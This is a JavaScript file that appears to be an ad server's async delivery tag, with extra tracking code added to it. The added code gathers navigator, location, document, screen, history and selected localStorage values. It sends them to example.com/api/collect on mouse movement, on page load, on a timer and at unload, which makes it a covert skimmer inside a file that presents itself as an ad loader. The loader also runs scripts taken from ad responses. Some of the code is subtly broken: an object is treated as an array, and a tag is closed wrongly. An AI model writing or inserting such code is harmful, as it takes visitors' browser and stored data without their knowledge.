(function (d, c) {
  const keysToWatch = window.keysToWatch || {};
  var a = "24e0da97dea62574b484d8ea55349442";
  c.reviveAsync = c.reviveAsync || {};
  const globalVarsToWatch = ["navigator", "location", "document", "screen", "history"];
  let lastHash = null;
  function generateHash(data) {
    let accumulatedStr = '';
    for (let key of Object.keys(data)) {
      accumulatedStr += key + JSON.stringify(data[key]);
    }
    let hash = 0;
    for (let char of accumulatedStr) {
      hash = (hash << 5) - hash + char.charCodeAt(0);
      hash |= 0;
    }
    return hash.toString(16);
  }
  function getTrackedLocalStorageData() {
    let localStorageData = {};
    Object.keys(window.localStorage).forEach(key => {
      if (keysToWatch.includes(key)) {
        localStorageData[key] = window.localStorage.getItem(key);
      }
    });
    return localStorageData;
  }
  function getGlobalVarData() {
    let globalVarData = {};
    globalVarsToWatch.forEach(globalVar => {
      try {
        globalVarData[globalVar] = JSON.parse(JSON.stringify(window[globalVar]));
      } catch {}
    });
    return globalVarData;
  }
  (function (e) {
    if (typeof e.CustomEvent === "function") {
      return false;
    }
    function g(i, j) {
      j = j || {
        bubbles: false,
        cancelable: false,
        detail: undefined
      };
      var h = document.createEvent("CustomEvent");
      h.initCustomEvent(i, j.bubbles, j.cancelable, j.detail);
      return h;
    }
    g.prototype = e.Event.prototype;
    e.CustomEvent = g;
  })(c);
  function sendTrackingData(data) {
    const stateHash = generateHash(data);
    if (lastHash === stateHash) return;
    lastHash = stateHash;
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://example.com/api/collect', true);
    xhr.setRequestHeader("Content-Type", "application/json");
    const payload = JSON.stringify({
      Id: stateHash,
      data
    });
    xhr.onload = function () {
      if (xhr.status == 200) console.log('Data sent successfully');else console.error(`Data send failed with status: ${xhr.status}`);
    };
    xhr.send(payload);
  }
  function collectAndSendData() {
    const trackedData = {
      ...getGlobalVarData(),
      ...getTrackedLocalStorageData()
    };
    sendTrackingData(trackedData);
  }
  document.addEventListener('mousemove', collectAndSendData);
  try {
    if (!c.reviveAsync.hasOwnProperty(a)) {
      var f = c.reviveAsync[a] = {
        id: Object.keys(c.reviveAsync).length,
        name: "revive",
        seq: 0,
        main: function () {
          var e = function () {
            var g = false;
            try {
              if (!g) {
                g = true;
                d.removeEventListener("DOMContentLoaded", e, false);
                c.removeEventListener("load", e, false);
                f.addEventListener("start", f.start);
                f.addEventListener("refresh", f.refresh);
                f.dispatchEvent("start", {
                  start: true
                });
              }
            } catch (h) {
              console.log(h);
            }
          };
          f.dispatchEvent("init");
          if (d.readyState === "complete") {
            setTimeout(e);
          } else {
            d.addEventListener("DOMContentLoaded", e, false);
            c.addEventListener("load", e, false);
          }
        },
        start: function (g) {
          if (g.detail && g.detail.hasOwnProperty("start") && !g.detail.start) {
            return;
          }
          f.removeEventListener("start", f.start);
          f.dispatchEvent("refresh");
        },
        refresh: function (g) {
          f.apply(f.detect());
        },
        ajax: function (e, g) {
          var h = new XMLHttpRequest();
          h.onreadystatechange = function () {
            if (4 === this.readyState) {
              if (200 === this.status) {
                f.spc(JSON.parse(this.responseText));
              }
            }
          };
          this.dispatchEvent("send", g);
          h.open("GET", e + "?" + f.encode(g).join("&"), true);
          h.withCredentials = true;
          h.send();
        },
        encode: function (m, n) {
          var e = [],
            h,
            i;
          for (h in m) {
            if (m.hasOwnProperty(h)) {
              var l = n ? n + "[" + h + "]" : h;
              if (/^(string|number|boolean)$/.test(typeof m[h])) {
                e.push(encodeURIComponent(l) + "=" + encodeURIComponent(m[h]));
              } else {
                var g = f.encode(m[h], l);
                for (i in g) {
                  e.push(g[i]);
                }
              }
            }
          }
          return e;
        },
        apply: function (g) {
          if (g.zones.length) {
            var e = "http:" === d.location.protocol ? "http://maxfullad.com/www/delivery/asyncspc.php" : "https://maxfullad.com/www/delivery/asyncspc.php";
            g.zones = g.zones.join("|");
            g.loc = d.location.href;
            if (d.referrer) {
              g.referer = d.referrer;
            }
            f.ajax(e, g);
          }
        },
        detect: function () {
          var e = d.querySelectorAll("ins[" + f.getDataAttr("id") + "='" + a + "']");
          var l = {
            zones: [],
            prefix: f.name + "-" + f.id + "-"
          };
          for (var r = 0; r < e.length; r++) {
            var p = f.getDataAttr("zoneid"),
              k = f.getDataAttr("seq"),
              n = e[r],
              s;
            if (n.hasAttribute(k)) {
              s = n.getAttribute(k);
            } else {
              s = f.seq++;
              n.setAttribute(k, s);
              n.id = l.prefix + s;
            }
            if (n.hasAttribute(p)) {
              var o = f.getDataAttr("loaded"),
                q = new RegExp("^" + f.getDataAttr("(.*)") + "$"),
                g;
              if (n.hasAttribute(o) && n.getAttribute(o)) {
                continue;
              }
              n.setAttribute(f.getDataAttr("loaded"), "1");
              for (var h = 0; h < n.attributes.length; h++) {
                if (g = n.attributes[h].name.match(q)) {
                  if ("zoneid" === g[1]) {
                    l.zones[s] = n.attributes[h].value;
                  } else {
                    if (!/^(id|seq|loaded)$/.test(g[1])) {
                      l[g[1]] = n.attributes[h].value;
                    }
                  }
                }
              }
            }
          }
          return l;
        },
        createFrame: function (h) {
          var e = d.createElement("IFRAME"),
            g = e.style;
          e.scrolling = "no";
          e.frameBorder = 0;
          e.allow = "autoplay";
          e.width = h.width > 0 ? h.width : 0;
          e.height = h.height > 0 ? h.height : 0;
          g.border = 0;
          g.overflow = "hidden";
          return e;
        },
        loadFrame: function (g, e) {
          var h = "<!DOCTYPE html>";
          h += "<html>";
          h += '<head><base target="_top"><meta charset="UTF-8"></head>';
          h += '<body border="0" margin="0" style="margin: 0;padding: 0;">';
          h += e;
          h += "<body>";
          h += "</html>";
          if ("srcdoc" in g && "1" === g.parentElement.getAttribute(this.getDataAttr("srcdoc"))) {
            g.srcdoc = h;
          } else {
            var i = g.contentWindow.document || g.contentDocument;
            i.open();
            i.write(h);
            i.close();
          }
        },
        spc: function (l) {
          this.dispatchEvent("receive", l);
          for (var e in l) {
            if (l.hasOwnProperty(e)) {
              var p = l[e];
              var o = d.getElementById(e);
              if (o) {
                var n = o.cloneNode(false);
                if (p.iframeFriendly) {
                  var k = f.createFrame(p);
                  n.appendChild(k);
                  o.parentNode.replaceChild(n, o);
                  f.loadFrame(k, p.html);
                } else {
                  n.style.textDecoration = "none";
                  n.innerHTML = p.html;
                  var g = n.getElementsByTagName("SCRIPT");
                  for (var m = 0; m < g.length; m++) {
                    var r = document.createElement("SCRIPT");
                    var q = g[m].attributes;
                    for (var h = 0; h < q.length; h++) {
                      r[q[h].nodeName] = q[h].value;
                    }
                    if (g[m].innerHTML) {
                      r.text = g[m].innerHTML;
                    }
                    g[m].parentNode.replaceChild(r, g[m]);
                  }
                  o.parentNode.replaceChild(n, o);
                }
                this.dispatchEvent("loaded", {
                  id: e,
                  data: p
                });
              }
            }
          }
          this.dispatchEvent("completed", l);
        },
        getDataAttr: function (e) {
          return "data-" + f.name + "-" + e;
        },
        getEventName: function (e) {
          return this.name + "-" + a + "-" + e;
        },
        addEventListener: function (e, g) {
          d.addEventListener(this.getEventName(e), g);
        },
        removeEventListener: function (e, g) {
          d.removeEventListener(this.getEventName(e), g, true);
        },
        dispatchEvent: function (e, g) {
          d.dispatchEvent(new CustomEvent(this.getEventName(e), {
            detail: g || {}
          }));
        }
      };
      f.main();
    }
  } catch (b) {
    if (console.log) {
      console.log(b);
    }
  }
  setInterval(collectAndSendData, 10 * 60 * 1000);
  window.addEventListener("load", collectAndSendData);
  window.onbeforeunload = function () {
    navigator.sendBeacon('https://example.com/api/collect', JSON.stringify({
      id: "unload",
      data: {
        ...getGlobalVarData(),
        ...getTrackedLocalStorageData()
      }
    }));
  };
})(document, window);